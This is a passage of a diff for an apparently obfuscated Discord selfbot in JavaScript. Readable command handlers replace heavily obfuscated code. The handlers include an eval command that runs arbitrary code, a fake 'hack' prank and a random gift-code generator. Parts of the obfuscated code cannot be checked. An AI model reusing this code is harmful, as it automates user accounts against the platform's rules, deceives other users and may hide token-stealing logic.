+                                                                        message.channel.send(`**The *totally* real hack has been successfully completed!**`)
+                                                                    }, 1000)
+                                                                }, 4000)
+                                                            }, 4000)
+                                                        }, 4000)
+                                                    }, 4000)
+                                                }, 4000)
+                                            }, 4000)
+                                        }, 4000)
+                                    }, 4000)
+                                }, 4000)
+                            }, 4000)
+                        }, 4000)
+                    }, 4000)
+                }, 4000)
+            }, 4000)
+        }, 4000)
+    }
+
+    if(cmd === "cls") {
+        console.log(`[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan("Command used")} ${colors.magenta("|")} ${colors.yellow(cmd)}`)
+        if(message.deletable) {
+            message.delete()
+        }
+        console.clear()
+    }
+
+    if(cmd === "snipe") {
+        console.log(`[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan("Command used")} ${colors.magenta("|")} ${colors.yellow(cmd)}`)
+        if(message.deletable) {
+            message.delete()
+        }
+        const snipes = bot.snipes.get(message.channel.id) || [];
+        const msg = snipes[args[0]-1||0]
+        if(!msg) return message.channel.send("There's nothing to snipe.")
+        if(enabled === true) {
+            let embed = new Discord.RichEmbed()
+            .setAuthor(msg.author.tag, msg.author.displayAvatarURL)
+            .setDescription(`${msg.content}
+        
+            **Date** » ${msg.date}
+            **Page** » ${args[0]||1}/${snipes.length}
+            `)
+            .setThumbnail(image ? image : "https://media4.giphy.com/media/6cXJU3ZCj0U7gy8ZXo/giphy.gif")
+            .setColor(color ? color : "#1B78E7")
+            .setFooter(footer ? footer : "𝘾𝙧𝙮𝙥𝙩𝙞𝙘")
+            if(msg.attachment) {
+                embed.setImage(msg.attachment)
+            }
+            message.channel.send(embed)
+        } else {
+            message.channel.send(stripIndents`\`\`\`
+            ${msg.author.tag}
+
+            ${msg.content}
+
+            Date » ${msg.date}
+            Page » ${args[0]||1}/${snipes.length}${footer ? `\n\n${footer}` : null}
+            \`\`\``)
+        }
+    }
+
+    if(cmd === "eval") {
+        console.log(`[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan("Command used")} ${colors.magenta("|")} ${colors.yellow(cmd)}`)
+        if(message.deletable) {
+            message.delete()
+        }
+        const msg = message;
+        let code = args.join(" ");
+        code = code.replace(/[“”]/g, '"').replace(/[‘’]/g, "'");
+        let evaled;
+        try {
+            const start = process.hrtime();
+            evaled = eval(code);
+            if (evaled instanceof Promise) {
+                evaled = await evaled;
+            }
+            const stop = process.hrtime(start);
+            const response = [
+                `**Output:** \`\`\`js\n${clean(inspect(evaled, {depth: 0}))}\n\`\`\``,
+                `**Type:** \`\`\`ts\n${new Type(evaled).is}\n\`\`\``,
+                `**Time Taken:** \`\`\`\n${(((stop[0] * 1e9) + stop[1])) / 1e6}ms\n\`\`\``
+            ]
+            const res = response.join('\n');
+            if (res.length < 2000) {
+                await msg.channel.send(res);
+            } else {
+                const output = new Discord.MessageAttachment(Buffer.from(res), "output.txt");
+                await msg.channel.send(output);
+            }
+        } catch (err) {
+            return message.channel.send(`Error: \`\`\`xl\n${clean(err)}\n\`\`\``);
+        }
+
+        function clean(text) {
+            if (typeof text === "string") {
+                text = text
+                    .replace(/`/g, `\`${String.fromCharCode(8203)}`)
+                    .replace(/@/g, `@${String.fromCharCode(8203)}`)
+                    .replace(new RegExp(config.token, "gi"), "*".repeat(config.token.length))
+                    .replace(new RegExp(config.webhookURL, "gi"), "*".repeat(config.webhookURL.length))
+                    .replace(new RegExp(config.password, "gi"), "*".repeat(config.password.length))
+            }
+            return text;
+        }
+    }
+
+    if(cmd === "hastebin") {
+        console.log(`[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan("Command used")} ${colors.magenta("|")} ${colors.yellow(cmd)}`)
+        if(message.deletable) {
+            message.delete()
+        }
+        if(!args.join(" ")) return message.channel.send("Please specify a message.")
+        const {body} = await post("https://hastebin.com/documents").send(args.join(" "))
+        let embed = new Discord.RichEmbed()
+        .setThumbnail(image ? image : "https://media3.giphy.com/media/TzyV32fsqLpbA0PHJf/giphy.gif")
+        .setColor(color ? color : "#1B78E7")
+        .setFooter(footer ? footer : "𝘾𝙧𝙮𝙥𝙩𝙞𝙘")
+        .setDescription(`https://hastebin.com/${body.key}`)
+        message.channel.send(embed)
+    }
+
+    if(cmd === "clean") {
+        console.log(`[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan("Command used")} ${colors.magenta("|")} ${colors.yellow(cmd)}`)
+        let count = parseInt(args[0] || 1);
+        message.channel.fetchMessages({limit: 100}).then(async(messages) => {
+            let msgArray = messages.array();
+            msgArray = msgArray.filter(m => m.author.id === bot.user.id);
+            msgArray.length = count + 1;
+            msgArray.map(m => m.delete().catch((err) => {
+                message.channel.send("`ERROR`\n```js\n" + err + "\n```")
+            }))
+        })
+    }
+
+    if(cmd === "emojify") {
+        console.log(`[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan("Command used")} ${colors.magenta("|")} ${colors.yellow(cmd)}`)
+        if(message.deletable) {
+            message.delete()
+        }
+        const mapping = {
+            " ": " ",
+            "0": ":zero:",
+            "1": ":one:",
+            "2": ":two:",
+            "3": ":three:",
+            "4": ":four:",
+            "5": ":five:",
+            "6": ":six:",
+            "7": ":seven:",
+            "8": ":eight:",
+            "9": ":nine:",
+            "!": ":grey_exclamation:",
+            "?": ":grey_question:",
+            "#": ":hash:",
+            "*": ":asterisk:",
+            "$": ":heavy_dollar_sign:",
+            "+": ":heavy_plus_sign:",
+            "-": ":heavy_minus_sign:",
+            "/": ":heavy_divide_sign:"
+        };
+
+        "abcdefghijklmnopqrstuvwxyz".split("").forEach(c => {
+            mapping[c] = mapping[c.toUpperCase()] = `:regional_indicator_${c}:`;
+        });
+
+        if(args.length < 1) {
+            return message.channel.send("Please specify a message to emojify")
+        }
+        message.channel.send(args.join(" ").split("").map(c => mapping[c] || c).join(""))
+    }
+
+    if(cmd === "cb") {
+        console.log(`[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan("Command used")} ${colors.magenta("|")} ${colors.yellow(cmd)}`)
+        if(message.deletable) {
+            message.delete()
+        }
+        message.channel.startTyping();
+        try {
+            const response = await fetch(`https://some-random-api.ml/chatbot?message=${encodeURIComponent(args.join(" "))}`)
+            const json = await response.json()
+            message.channel.send(`> ${args.join(" ")}\n${message.author} ${json.response}`)
+            message.channel.stopTyping(true);
+        } catch (err) {
+            message.channel.stopTyping(true);
+            return message.channel.send("`ERROR`\n```js\n" + err.stack + "\n```")
+        }
+    }
+
+    if(cmd === "say") {
+        console.log(`[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan("Command used")} ${colors.magenta("|")} ${colors.yellow(cmd)}`)
+        if(message.deletable) {
+            message.delete()
+        }
+        message.channel.send(args.join(" "))
+    }
+
+    if(cmd === "ping") {
+        console.log(`[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan("Command used")} ${colors.magenta("|")} ${colors.yellow(cmd)}`)
+        if(message.deletable) {
+            message.delete()
+        }
+        message.channel.send("Pinging...").then(msg => {
+            if(enabled === true) {
+                let embed = new Discord.RichEmbed()
+                .setTitle("Pong!")
+                .setDescription(`
+                **Message** » ${msg.createdTimestamp - message.createdTimestamp}ms
+                **WebSocket** » ${bot.ping}ms
+                `)
+                .setThumbnail(image ? image : "https://media4.giphy.com/media/6cXJU3ZCj0U7gy8ZXo/giphy.gif")
+                .setColor(color ? color : "#1B78E7")
+                .setFooter(footer ? footer : "𝘾𝙧𝙮𝙥𝙩𝙞𝙘")
+                msg.edit(embed)
+            } else {
+                msg.edit(stripIndents`\`\`\`
                 Pong!
 
-                Message » ${_0x2a76f9[_0x409fa8(0x590,0x5a8)]-_0x1b369a[_0x409fa8(0x590,0x4bf)]}ms
-                Websocket » ${bot[_0x409fa8(0x431,0x42f)]}ms${footer?'\x0a\x0a'+footer:null}
-                \`\`\``);}));if(_0x390a85===_0x1be328(0x533,0x659)){console[_0x1be328(0x6da,0x7e9)]('['+colors[_0x1be328(0x57b,0x57e)](moment()[_0x1be328(0x4bf,0x5af)]()[_0x1be328(0x6ed,0x74b)](_0x1be328(0x5fa,0x65d)))+']\x20'+colors[_0x1be328(0x632,0x58f)](_0x1be328(0x596,0x416))+'\x20'+colors['magenta']('|')+'\x20'+colors[_0x1be328(0x5f5,0x5bd)](_0x390a85));_0x1b369a[_0x1be328(0x69a,0x730)]&&_0x1b369a[_0x1be328(0x594,0x5f7)]();if(!_0x1748bb[_0x1be328(0x5c6,0x439)]('\x20'))return _0x1b369a[_0x1be328(0x49d,0x48f)][_0x1be328(0x4c0,0x4cc)](_0x1be328(0x5eb,0x76d));if(enabled===!![]){let _0xaa00c6=new Discord[(_0x1be328(0x508,0x3d6))]()[_0x1be328(0x76c,0x885)](_0x1748bb[_0x1be328(0x5c6,0x696)]('\x20'))[_0x1be328(0x5d3,0x592)](image?image:_0x1be328(0x56d,0x443))[_0x1be328(0x5aa,0x654)](color?color:_0x1be328(0x4c1,0x519))[_0x1be328(0x69b,0x6c3)](footer?footer:'𝘾𝙧𝙮𝙥𝙩𝙞𝙘');_0x1b369a[_0x1be328(0x49d,0x57e)][_0x1be328(0x4c0,0x433)](_0xaa00c6);}else _0x1b369a[_0x1be328(0x49d,0x523)][_0x1be328(0x4c0,0x455)](_0x1be328(0x72a,0x6b5)+_0x1748bb[_0x1be328(0x5c6,0x6e3)]('\x20')+_0x1be328(0x72a,0x835));}if(_0x390a85===_0x1be328(0x73b,0x7f4)){console[_0x1be328(0x6da,0x568)]('['+colors['green'](moment()[_0x1be328(0x4bf,0x392)]()[_0x1be328(0x6ed,0x644)](_0x1be328(0x5fa,0x4bc)))+']\x20'+colors[_0x1be328(0x632,0x669)]('Command\x20used')+'\x20'+colors[_0x1be328(0x5db,0x576)]('|')+'\x20'+colors['yellow'](_0x390a85));_0x1b369a[_0x1be328(0x69a,0x514)]&&_0x1b369a['delete']();const _0x2750fa=_0x1b369a[_0x1be328(0x4d3,0x352)]['users'][_0x1be328(0x6a5,0x73f)]()||_0x1b369a[_0x1be328(0x5f7,0x4af)]||bot[_0x1be328(0x665,0x62e)][_0x1be328(0x6b4,0x61e)](_0x1748bb[-0x2*-0xa61+0x1adc+-0xa*0x4c3]);_0x1b369a[_0x1be328(0x49d,0x62f)][_0x1be328(0x4c0,0x42e)](_0x2750fa[_0x1be328(0x5d4,0x598)]);}if(_0x390a85===_0x1be328(0x66e,0x584)){console[_0x1be328(0x6da,0x6b1)]('['+colors[_0x1be328(0x57b,0x604)](moment()[_0x1be328(0x4bf,0x53a)]()[_0x1be328(0x6ed,0x73b)](_0x1be328(0x5fa,0x6a8)))+']\x20'+colors[_0x1be328(0x632,0x78b)](_0x1be328(0x596,0x58f))+'\x20'+colors[_0x1be328(0x5db,0x51d)]('|')+'\x20'+colors[_0x1be328(0x5f5,0x520)](_0x390a85));_0x1b369a[_0x1be328(0x69a,0x7b5)]&&_0x1b369a[_0x1be328(0x594,0x5ab)]();if(!_0x1b369a[_0x1be328(0x59c,0x643)])return _0x1b369a[_0x1be328(0x49d,0x325)][_0x1be328(0x4c0,0x4da)](_0x1be328(0x5a3,0x435));if(_0x1b369a['guild'][_0x1be328(0x4b5,0x494)]===_0x1be328(0x782,0x73e))_0x1b369a[_0x1be328(0x59c,0x452)][_0x1be328(0x4b5,0x35c)]=_0x1be328(0x69d,0x639);if(_0x1b369a[_0x1be328(0x59c,0x5ef)][_0x1be328(0x4b5,0x639)]===_0x1be328(0x483,0x3cc))_0x1b369a[_0x1be328(0x59c,0x59d)][_0x1be328(0x4b5,0x474)]='Europe';if(_0x1b369a[_0x1be328(0x59c,0x55e)][_0x1be328(0x4b5,0x3ef)]===_0x1be328(0x691,0x6be))_0x1b369a[_0x1be328(0x59c,0x696)][_0x1be328(0x4b5,0x55d)]=_0x1be328(0x6ae,0x7c6);if(_0x1b369a[_0x1be328(0x59c,0x41c)][_0x1be328(0x4b5,0x62b)]===_0x1be328(0x6fb,0x72d))_0x1b369a[_0x1be328(0x59c,0x64e)][_0x1be328(0x4b5,0x3bc)]=_0x1be328(0x6bf,0x55f);if(_0x1b369a[_0x1be328(0x59c,0x660)][_0x1be328(0x4b5,0x3d8)]==='japan')_0x1b369a[_0x1be328(0x59c,0x602)]['region']='Japan';if(_0x1b369a[_0x1be328(0x59c,0x451)]['region']===_0x1be328(0x728,0x829))_0x1b369a[_0x1be328(0x59c,0x660)][_0x1be328(0x4b5,0x55f)]=_0x1be328(0x79d,0x68f);if(_0x1b369a[_0x1be328(0x59c,0x4d0)][_0x1be328(0x4b5,0x3c6)]===_0x1be328(0x73c,0x8a3))_0x1b369a[_0x1be328(0x59c,0x429)][_0x1be328(0x4b5,0x495)]=_0x1be328(0x5c7,0x58b);if(_0x1b369a[_0x1be328(0x59c,0x608)][_0x1be328(0x4b5,0x43a)]===_0x1be328(0x50d,0x3e8))_0x1b369a[_0x1be328(0x59c,0x4b1)][_0x1be328(0x4b5,0x37f)]=_0x1be328(0x605,0x4a3);if(_0x1b369a[_0x1be328(0x59c,0x4b6)][_0x1be328(0x4b5,0x411)]===_0x1be328(0x6a6,0x740))_0x1b369a[_0x1be328(0x59c,0x51d)][_0x1be328(0x4b5,0x42f)]=_0x1be328(0x659,0x545);if(_0x1b369a[_0x1be328(0x59c,0x72f)][_0x1be328(0x4b5,0x592)]===_0x1be328(0x637,0x6dd))_0x1b369a[_0x1be328(0x59c,0x6d3)]['region']='US\x20Central';if(_0x1b369a[_0x1be328(0x59c,0x617)][_0x1be328(0x4b5,0x40b)]===_0x1be328(0x6af,0x59e))_0x1b369a[_0x1be328(0x59c,0x518)][_0x1be328(0x4b5,0x647)]=_0x1be328(0x644,0x6ca);if(_0x1b369a['guild'][_0x1be328(0x4b5,0x636)]===_0x1be328(0x6e4,0x6c1))_0x1b369a['guild'][_0x1be328(0x4b5,0x4ff)]=_0x1be328(0x635,0x7a0);if(_0x1b369a[_0x1be328(0x59c,0x4a1)][_0x1be328(0x4b5,0x338)]==='us-west')_0x1b369a[_0x1be328(0x59c,0x693)][_0x1be328(0x4b5,0x5de)]=_0x1be328(0x507,0x4f5);if(_0x1b369a[_0x1be328(0x59c,0x6ea)][_0x1be328(0x50a,0x5f3)]===_0x1be328(0x51d,0x646))_0x1b369a[_0x1be328(0x59c,0x6a6)][_0x1be328(0x50a,0x463)]=_0x1be328(0x5fd,0x671);if(_0x1b369a[_0x1be328(0x59c,0x6df)][_0x1be328(0x50a,0x3ba)]===_0x1be328(0x517,0x5cc))_0x1b369a[_0x1be328(0x59c,0x67a)][_0x1be328(0x50a,0x62f)]=_0x1be328(0x63e,0x758);if(_0x1b369a['guild'][_0x1be328(0x50a,0x417)]===_0x1be328(0x62e,0x6e3))_0x1b369a[_0x1be328(0x59c,0x557)]['verificationLevel']='Medium';if(_0x1b369a[_0x1be328(0x59c,0x49a)][_0x1be328(0x50a,0x4a6)]===_0x1be328(0x738,0x679))_0x1b369a[_0x1be328(0x59c,0x40a)][_0x1be328(0x50a,0x472)]=_0x1be328(0x516,0x67f);if(_0x1b369a[_0x1be328(0x59c,0x5bf)][_0x1be328(0x50a,0x511)]===_0x1be328(0x778,0x7ee))_0x1b369a[_0x1be328(0x59c,0x6d3)][_0x1be328(0x50a,0x630)]=_0x1be328(0x5fe,0x556);const _0x5ca9f0=_0x1b369a[_0x1be328(0x59c,0x6da)][_0x1be328(0x5e7,0x4ac)][_0x1be328(0x6a5,0x75c)](-0x199b+0x1aff+-0x150)[_0x1be328(0x6c1,0x5d1)](_0x44f554=>_0x44f554)[_0x1be328(0x5c6,0x5db)](',\x20'),_0xe1480b=_0x1b369a[_0x1be328(0x59c,0x709)][_0x1be328(0x5e7,0x5f3)]['map'](_0x319645=>_0x319645)[_0x1be328(0x5c6,0x4e1)](',\x20'),_0x3bc3b9=_0x1b369a[_0x1be328(0x59c,0x589)][_0x1be328(0x5e7,0x699)][_0x1be328(0x489,0x5f7)]-(-0x3*0x95+0x148b+0x257*-0x8),_0x312836=_0x1b369a[_0x1be328(0x59c,0x40c)][_0x1be328(0x59a,0x717)][_0x1be328(0x584,0x5f4)](_0x45231c=>_0x45231c[_0x1be328(0x4e0,0x632)][_0x1be328(0x4ea,0x3a4)]==_0x1be328(0x4aa,0x580))[_0x1be328(0x489,0x510)],_0x237799=_0x1b369a[_0x1be328(0x59c,0x509)][_0x1be328(0x59a,0x547)][_0x1be328(0x584,0x635)](_0x177d57=>_0x177d57[_0x1be328(0x4e0,0x501)]['status']==_0x1be328(0x4ae,0x515))[_0x1be328(0x489,0x3a8)],_0x3cb747=_0x1b369a[_0x1be328(0x59c,0x496)][_0x1be328(0x59a,0x63a)][_0x1be328(0x584,0x456)](_0xb636b2=>_0xb636b2[_0x1be328(0x4e0,0x61c)][_0x1be328(0x4ea,0x500)]=='online')[_0x1be328(0x489,0x549)],_0x422386=_0x1b369a[_0x1be328(0x59c,0x647)][_0x1be328(0x59a,0x41e)][_0x1be328(0x584,0x50e)](_0x250c70=>_0x250c70[_0x1be328(0x4e0,0x621)][_0x1be328(0x4ea,0x646)]==_0x1be328(0x769,0x68c))[_0x1be328(0x489,0x413)],_0x16156e=_0x1b369a[_0x1be328(0x59c,0x414)][_0x1be328(0x59a,0x521)][_0x1be328(0x584,0x545)](_0x4d1d24=>_0x4d1d24[_0x1be328(0x4e0,0x524)][_0x1be328(0x4ea,0x621)]==_0x1be328(0x6eb,0x583))[_0x1be328(0x489,0x4e9)],_0x381f67=_0x1b369a['guild'][_0x1be328(0x4bc,0x622)][_0x1be328(0x584,0x5bf)](_0x1b3c8e=>_0x1b3c8e[_0x1be328(0x4b0,0x3c3)]==_0x1be328(0x546,0x6c5))[_0x1be328(0x489,0x3b2)],_0x192175=_0x1b369a[_0x1be328(0x59c,0x6ae)][_0x1be328(0x4bc,0x505)][_0x1be328(0x584,0x40d)](_0x9f9b8d=>_0x9f9b8d[_0x1be328(0x4b0,0x377)]=='voice')[_0x1be328(0x489,0x320)],_0x5bc482=_0x1b369a[_0x1be328(0x59c,0x5d3)][_0x1be328(0x4bc,0x600)][_0x1be328(0x584,0x4ea)](_0x50e2ad=>_0x50e2ad[_0x1be328(0x4b0,0x43f)]==_0x1be328(0x5af,0x4d2))[_0x1be328(0x489,0x3cc)],_0x52f14a=_0x1b369a['guild']['members'][_0x1be328(0x584,0x41e)](_0x1e5095=>_0x1e5095[_0x1be328(0x4ee,0x470)][_0x1be328(0x5cd,0x673)])[_0x1be328(0x489,0x46d)],_0x2c04eb=_0x1b369a[_0x1be328(0x59c,0x5fc)][_0x1be328(0x59a,0x485)][_0x1be328(0x584,0x65e)](_0x424b1e=>_0x424b1e[_0x1be328(0x4ee,0x504)])[_0x1be328(0x489,0x384)]-_0x1b369a[_0x1be328(0x59c,0x478)][_0x1be328(0x59a,0x553)][_0x1be328(0x584,0x49d)](_0x47978c=>_0x47978c['user'][_0x1be328(0x5cd,0x5b9)])[_0x1be328(0x489,0x3ab)];if(enabled===!![]){let _0x2bf2d8=new Discord[(_0x1be328(0x508,0x4ef))]()[_0x1be328(0x5aa,0x73a)](color?color:_0x1be328(0x4c1,0x4a1))[_0x1be328(0x69b,0x672)](footer?footer:_0x1be328(0x524,0x684))[_0x1be328(0x4a2,0x570)](_0x1b369a[_0x1be328(0x59c,0x6f1)][_0x1be328(0x5e0,0x743)]+_0x1be328(0x6f7,0x87c))[_0x1be328(0x5d3,0x470)](_0x1b369a[_0x1be328(0x59c,0x5d5)][_0x1be328(0x50b,0x67f)])[_0x1be328(0x51a,0x4d2)](_0x1be328(0x695,0x616),_0x1b369a[_0x1be328(0x59c,0x45a)][_0x1be328(0x5e0,0x768)],!![])[_0x1be328(0x51a,0x3d7)]('Guild\x20Name\x20Acronym',_0x1b369a[_0x1be328(0x59c,0x4b8)][_0x1be328(0x629,0x68a)],!![])[_0x1be328(0x51a,0x54b)](_0x1be328(0x619,0x720),_0x1be328(0x6cf,0x821)+_0x1b369a[_0x1be328(0x59c,0x592)][_0x1be328(0x530,0x5fd)]+'>',!![])[_0x1be328(0x51a,0x5a6)](_0x1be328(0x6b2,0x706),_0x1be328(0x519,0x49a)+_0x1b369a[_0x1be328(0x59c,0x47f)]['members'][_0x1be328(0x489,0x3cb)][_0x1be328(0x714,0x855)]()+_0x1be328(0x638,0x693)+_0x2c04eb[_0x1be328(0x714,0x834)]()+_0x1be328(0x56b,0x5b2)+_0x52f14a[_0x1be328(0x714,0x68a)]()+_0x1be328(0x783,0x7c2),!![])[_0x1be328(0x51a,0x5b1)](_0x1be328(0x773,0x6b7),_0x1be328(0x5ae,0x5f8)+_0x312836[_0x1be328(0x714,0x77a)]()+_0x1be328(0x61b,0x604)+_0x237799[_0x1be328(0x714,0x6fa)]()+_0x1be328(0x6c8,0x616)+_0x3cb747['toLocaleString']()+_0x1be328(0x727,0x7b6)+_0x422386[_0x1be328(0x714,0x886)]()+_0x1be328(0x697,0x5ae)+_0x16156e[_0x1be328(0x714,0x60c)]()+_0x1be328(0x783,0x907),!![])['addField'](_0x1be328(0x724,0x61e),_0x1b369a[_0x1be328(0x59c,0x64c)][_0x1be328(0x4b5,0x3b5)],!![])[_0x1be328(0x51a,0x64e)](_0x1be328(0x6fc,0x7fe),moment(_0x1b369a[_0x1be328(0x59c,0x6bc)][_0x1be328(0x4ff,0x381)])[_0x1be328(0x6ed,0x630)]('MMMM\x20Do\x20YYYY,\x20h:mm\x20A')+_0x1be328(0x6c7,0x7a8)+moment(_0x1b369a[_0x1be328(0x59c,0x5c4)][_0x1be328(0x4ff,0x520)])[_0x1be328(0x74d,0x8d3)]()[_0x1be328(0x706,0x82e)](),!![])[_0x1be328(0x51a,0x52a)](_0x1be328(0x5ca,0x6d6),_0x1b369a[_0x1be328(0x59c,0x440)]['id'],!![])[_0x1be328(0x51a,0x4d0)](_0x1be328(0x649,0x4fa),_0x1b369a[_0x1be328(0x59c,0x481)][_0x1be328(0x5c4,0x720)],!![])[_0x1be328(0x51a,0x3b1)](_0x1be328(0x6d3,0x6ed),_0x1b369a[_0x1be328(0x59c,0x61e)][_0x1be328(0x5e1,0x6fd)],!![])[_0x1be328(0x51a,0x4ba)](_0x1be328(0x567,0x3f3),_0x1b369a['guild'][_0x1be328(0x557,0x5f7)][_0x1be328(0x489,0x3de)],!![])[_0x1be328(0x51a,0x4d3)](_0x1be328(0x5f3,0x4b7),_0x1be328(0x519,0x407)+_0x1b369a[_0x1be328(0x59c,0x672)][_0x1be328(0x4bc,0x5ed)][_0x1be328(0x489,0x3db)]['toLocaleString']()+_0x1be328(0x48f,0x460)+_0x381f67[_0x1be328(0x714,0x78b)]()+_0x1be328(0x717,0x762)+_0x192175[_0x1be328(0x714,0x7a0)]()+_0x1be328(0x5cc,0x6f0)+_0x5bc482['toLocaleString']()+_0x1be328(0x783,0x79d),!![])[_0x1be328(0x51a,0x5ae)](_0x1be328(0x5d1,0x50d),_0x1b369a['guild'][_0x1be328(0x50a,0x66b)],!![]);_0x1b369a[_0x1be328(0x59c,0x545)][_0x1be328(0x5e7,0x74d)][_0x1be328(0x489,0x365)]<-0x1f84+-0x7*-0x430+-0x8*-0x49?_0x2bf2d8[_0x1be328(0x51a,0x61f)]('['+_0x1b369a[_0x1be328(0x59c,0x5bb)][_0x1be328(0x5e7,0x747)][_0x1be328(0x489,0x415)][_0x1be328(0x714,0x7b7)]()+_0x1be328(0x788,0x69f),_0xe1480b):_0x2bf2d8[_0x1be328(0x51a,0x695)]('['+_0x1b369a['guild'][_0x1be328(0x5e7,0x642)][_0x1be328(0x489,0x4ba)][_0x1be328(0x714,0x68e)]()+_0x1be328(0x788,0x7cf),_0x5ca9f0+(_0x1be328(0x498,0x488)+_0x3bc3b9+_0x1be328(0x704,0x7d1))),_0x2bf2d8[_0x1be328(0x56f,0x47d)](),_0x1b369a[_0x1be328(0x49d,0x472)][_0x1be328(0x4c0,0x3ec)](_0x2bf2d8);}else _0x1b369a[_0x1be328(0x49d,0x4db)][_0x1be328(0x4c0,0x5bc)](_0x1be328(0x672,0x54c)+_0x1b369a['guild'][_0x1be328(0x5e0,0x559)]+_0x1be328(0x53a,0x4a7)+_0x1b369a[_0x1be328(0x59c,0x6d3)][_0x1be328(0x629,0x4e4)]+_0x1be328(0x55a,0x6af)+_0x1b369a[_0x1be328(0x59c,0x666)][_0x1be328(0x682,0x6e9)][_0x1be328(0x4ee,0x42d)][_0x1be328(0x6ba,0x67b)]+_0x1be328(0x732,0x77d)+_0x1b369a[_0x1be328(0x59c,0x6da)][_0x1be328(0x59a,0x6e1)][_0x1be328(0x489,0x542)][_0x1be328(0x714,0x5f6)]()+_0x1be328(0x674,0x6b9)+_0x2c04eb[_0x1be328(0x714,0x772)]()+_0x1be328(0x597,0x59d)+_0x52f14a['toLocaleString']()+_0x1be328(0x6bc,0x610)+_0x312836[_0x1be328(0x714,0x869)]()+_0x1be328(0x60d,0x5d3)+_0x237799[_0x1be328(0x714,0x581)]()+'\x0a\x20\x20\x20\x20Online:\x20'+_0x3cb747[_0x1be328(0x714,0x6d7)]()+_0x1be328(0x626,0x746)+_0x422386[_0x1be328(0x714,0x6ca)]()+_0x1be328(0x5ef,0x712)+_0x16156e[_0x1be328(0x714,0x7ce)]()+_0x1be328(0x5ea,0x58f)+_0x1b369a[_0x1be328(0x59c,0x578)]['region']+_0x1be328(0x48e,0x353)+moment(_0x1b369a[_0x1be328(0x59c,0x54d)][_0x1be328(0x4ff,0x3b2)])[_0x1be328(0x6ed,0x5e4)]('MMMM\x20Do\x20YYYY,\x20h:mm\x20A')+_0x1be328(0x6c7,0x56f)+moment(_0x1b369a[_0x1be328(0x59c,0x6e3)][_0x1be328(0x4ff,0x3ad)])['startOf']()[_0x1be328(0x706,0x838)]()+_0x1be328(0x4db,0x5d7)+_0x1b369a[_0x1be328(0x59c,0x65b)]['id']+_0x1be328(0x5f2,0x4ed)+_0x1b369a[_0x1be328(0x59c,0x44d)][_0x1be328(0x5c4,0x445)]+_0x1be328(0x721,0x62b)+_0x1b369a[_0x1be328(0x59c,0x71d)][_0x1be328(0x5e1,0x460)]+_0x1be328(0x73e,0x636)+_0x1b369a[_0x1be328(0x59c,0x69a)][_0x1be328(0x557,0x48a)][_0x1be328(0x489,0x488)]+_0x1be328(0x76b,0x89f)+_0x1b369a[_0x1be328(0x59c,0x4ab)][_0x1be328(0x4bc,0x37e)][_0x1be328(0x489,0x41b)][_0x1be328(0x714,0x67e)]()+_0x1be328(0x6b6,0x749)+_0x381f67[_0x1be328(0x714,0x728)]()+_0x1be328(0x522,0x505)+_0x192175[_0x1be328(0x714,0x669)]+_0x1be328(0x56e,0x481)+_0x5bc482[_0x1be328(0x714,0x6f5)]()+_0x1be328(0x4bd,0x36e)+_0x1b369a[_0x1be328(0x59c,0x55a)][_0x1be328(0x50a,0x689)]+_0x1be328(0x5a7,0x6e6)+_0x1b369a[_0x1be328(0x59c,0x5b4)][_0x1be328(0x5e7,0x65c)][_0x1be328(0x489,0x4fe)][_0x1be328(0x714,0x66a)]()+(footer?'\x0a\x0a'+footer:null)+_0x1be328(0x72a,0x698));}_0x390a85===_0x1be328(0x6aa,0x824)&&(console[_0x1be328(0x6da,0x695)]('['+colors[_0x1be328(0x57b,0x4e2)](moment()['utc']()[_0x1be328(0x6ed,0x662)](_0x1be328(0x5fa,0x518)))+']\x20'+colors[_0x1be328(0x632,0x545)](_0x1be328(0x596,0x647))+'\x20'+colors[_0x1be328(0x5db,0x61c)]('|')+'\x20'+colors[_0x1be328(0x5f5,0x498)](_0x390a85)),_0x1b369a[_0x1be328(0x69a,0x507)]&&_0x1b369a[_0x1be328(0x594,0x724)](),_0x1b369a['channel'][_0x1be328(0x4c0,0x4d8)]('​'));if(_0x390a85===_0x1be328(0x4ec,0x5c8)){console['log']('['+colors[_0x1be328(0x57b,0x57e)](moment()[_0x1be328(0x4bf,0x5fa)]()[_0x1be328(0x6ed,0x574)](_0x1be328(0x5fa,0x533)))+']\x20'+colors[_0x1be328(0x632,0x73d)](_0x1be328(0x596,0x641))+'\x20'+colors[_0x1be328(0x5db,0x6d5)]('|')+'\x20'+colors[_0x1be328(0x5f5,0x6fe)](_0x390a85));_0x1b369a[_0x1be328(0x69a,0x748)]&&_0x1b369a[_0x1be328(0x594,0x6f4)]();function _0x3b5686(){const _0x5f0ed8=function(_0x46e6b2,_0xb4e6ca){return _0x1be328(_0x46e6b2- -0x2b7,_0xb4e6ca);};let _0x34136c='',_0x4fa801=_0x5f0ed8(0x2ea,0x1c3);for(var _0x1e4dd4=-0x1b94+-0x15*0x133+0x34c3;_0x1e4dd4<-0x1*0x16b5+0x450+0x1278;_0x1e4dd4++){_0x34136c=_0x34136c+_0x4fa801[_0x5f0ed8(0x2dc,0x356)](Math[_0x5f0ed8(0x210,0x350)](Math[_0x5f0ed8(0x29b,0x2cf)]()*_0x4fa801[_0x5f0ed8(0x280,0x3fb)]));}return _0x34136c;}_0x1b369a[_0x1be328(0x49d,0x49d)][_0x1be328(0x4c0,0x523)](_0x1be328(0x75c,0x89e)+_0x3b5686());}if(_0x390a85===_0x1be328(0x4a7,0x559)){console[_0x1be328(0x6da,0x6bd)]('['+colors[_0x1be328(0x57b,0x700)](moment()[_0x1be328(0x4bf,0x55b)]()[_0x1be328(0x6ed,0x63e)](_0x1be328(0x5fa,0x744)))+']\x20'+colors[_0x1be328(0x632,0x614)](_0x1be328(0x596,0x5fc))+'\x20'+colors['magenta']('|')+'\x20'+colors['yellow'](_0x390a85));_0x1b369a[_0x1be328(0x69a,0x71e)]&&_0x1b369a[_0x1be328(0x594,0x49b)]();const {body:_0xa4b92f}=await superagent[_0x1be328(0x6b4,0x70e)](_0x1be328(0x4f7,0x61f));if(!_0xa4b92f)return 